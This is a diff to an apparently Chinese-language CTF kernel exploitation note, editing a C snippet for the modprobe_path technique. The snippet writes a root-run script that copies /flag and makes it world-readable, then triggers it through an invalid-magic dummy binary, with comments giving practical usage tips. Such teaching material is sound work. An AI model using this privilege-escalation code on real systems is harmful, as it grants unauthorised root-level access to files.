@@ -118,21 +118,25 @@ modprobe_path可以利用的原因如下:<br>
 `modprobe_path`也是内核常用的利用手段。<br>
 `modprobe_path`有使用细节需要注意：<br>
 ```c
-void get_flag(void){
+void environ_set(void){
     puts("[*] Returned to userland, setting up for fake modprobe");
     
-    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");//细节1：运行bash脚本前必须添加上 #!/bin/sh 否则触发了也不执行。
-    system("chmod +x /tmp/x");
+    system("mkdir /tmp");
+    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");//细节1：运行bash脚本前必须添加上 #!/bin/sh 否则触发了也不执行。
+    system("chmod +x /tmp/exp");
 
     system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
     system("chmod +x /tmp/dummy");
+    //exit(0);
+}
 
+
+void get_flag(void){
     puts("[*] Run unknown file");
     system("/tmp/dummy");//细节2： 运行未知文件要写全局路径，最好不要用./
 
     puts("[*] Hopefully flag is readable");
     system("cat /tmp/flag");// 细节3：内核态执行/tmp/x文件时，不能直接cat /flag，因为没有文件描述符，所以看不到内容。
-
     exit(0);
 }
 ```
